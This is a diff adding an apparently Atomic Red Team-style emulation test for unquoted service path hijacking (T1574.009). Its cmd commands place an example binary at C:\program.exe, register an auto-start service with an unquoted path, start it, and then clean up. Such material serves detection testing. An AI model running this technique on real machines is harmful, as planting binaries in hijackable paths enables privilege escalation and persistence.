@@ -1,0 +1,18 @@
+#TechniqueName: Hijack Execution Flow: Path Interception by Unquoted Path
+#AtomicTestName: Execution of program.exe as service with unquoted service path
+#Language: cmd
+
+#commands
+copy PathToAtomicsFolder\T1574.009\bin\WindowsServiceExample.exe "C:\Program Files\windows_service.exe"
+copy PathToAtomicsFolder\T1574.009\bin\WindowsServiceExample.exe "C:\program.exe"
+sc create "Example Service" binpath= "C:\Program Files\windows_service.exe" Displayname= "Example Service" start= auto
+sc start "Example Service"
+
+
+#cleanup_commands
+sc stop "Example Service" >nul 2>&1
+sc delete "Example Service" >nul 2>&1
+del "C:\Program Files\windows_service.exe" >nul 2>&1
+del "C:\program.exe" >nul 2>&1
+del "C:\Time.log" >nul 2>&1
+
